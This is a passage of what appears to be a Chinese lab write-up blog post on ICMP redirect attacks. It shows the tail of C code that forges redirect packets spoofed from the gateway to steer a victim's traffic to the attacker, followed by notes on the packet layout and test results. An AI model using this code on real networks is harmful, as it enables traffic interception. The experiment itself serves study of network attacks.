class="line">iph-&gt;ip_src.s_addr = inet_addr(ip_gw); <span class="comment">//源地址为网关地址</span></span><br><span class="line"></span><br><span class="line">iph-&gt;ip_dst.s_addr = inet_addr(ip_tgt); <span class="comment">//目的地址为被攻击机地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//填充icmp头部</span></span><br><span class="line"></span><br><span class="line">icmph-&gt;icmp_type = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">icmph-&gt;icmp_code = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">icmph-&gt;icmp_hun.ih_gwaddr.s_addr = inet_addr(ip_atk); <span class="comment">//重定向到攻击者地址</span></span><br><span class="line"></span><br><span class="line">icmph-&gt;icmp_cksum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">icmph-&gt;icmp_cksum = checksum(out_packet + <span class="number">20</span>, <span class="number">36</span>); <span class="comment">//检验和</span></span><br><span class="line"></span><br><span class="line">dest.sin_family = AF_INET; \</span><br><span class="line"></span><br><span class="line">dest.sin_addr.s_addr = inet_addr(ip_tgt); <span class="comment">//目标ip</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(sendto(sockfd, &amp;out_packet, <span class="number">56</span>, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)&amp;dest, <span class="keyword">sizeof</span>(dest)) &lt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Error number: %d\n&quot;</span>, errno);</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数说明：sendto() 用来将数据由指定的socket 传给对方主机. 参数s 为已建好连线的socket, 如果利用UDP协议则不需经过连线操作. 参数msg 指向欲连线的数据内容, 参数flags 一般设0, 详细描述请参考send(). 参数to 用来指定欲传送的网络地址, 结构sockaddr 请参考bind(). 参数tolen 为sockaddr 的结果长度.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Sent a packet\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对于数据包，前14字节为帧首部，之后20字节为ip首部，之后8字节为icmp首部，之后28字节的内容应填写为针对的原始ip首部及数据部分前28字节。（实验中测试了这28字节，发现一个比较疑惑的点：无论是否填写该部分内容，对结果都没有影响，都可以实现重定向。）</p>
+<ol start="3">
+<li>代码实现结果：</li>
+</ol>
+<p>可以看到，攻击机进行攻击时会不断嗅探受害者发送的包，并返回一个重定向包。</p>
+<p><img src="/../images/image-20221211153200226.png" alt="image-20221211153200226"></p>
+<p>此时受害者进行ping操作时，会收到重定向包。</p>
+<p><img src="/../images/image-20221211153220185.png" alt="image-20221211153220185"></p>
+<p>利用wireshark抓包，可以看到重定向包内容，且该重定向包的源IP为原网关的IP地址。</p>
+<p><img src="/../images/image-20221211153235749.png" alt="image-20221211153235749"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">一 实验原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">二 实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.</span> <span class="toc-text">三 实验步骤</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://k4nn0n.github.io/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://k4nn0n.github.io/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/&text=ICMP重定向攻击"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://k4nn0n.github.io/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/&title=ICMP重定向攻击"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://k4nn0n.github.io/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/&is_video=false&description=ICMP重定向攻击"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ICMP重定向攻击&body=Check out this article: https://k4nn0n.github.io/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://k4nn0n.github.io/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/&title=ICMP重定向攻击"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://k4nn0n.github.io/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/&title=ICMP重定向攻击"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://k4nn0n.github.io/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/&title=ICMP重定向攻击"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://k4nn0n.github.io/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/&title=ICMP重定向攻击"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://k4nn0n.github.io/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/&name=ICMP重定向攻击&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://k4nn0n.github.io/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/&t=ICMP重定向攻击"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2022
+    K4NN0N
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
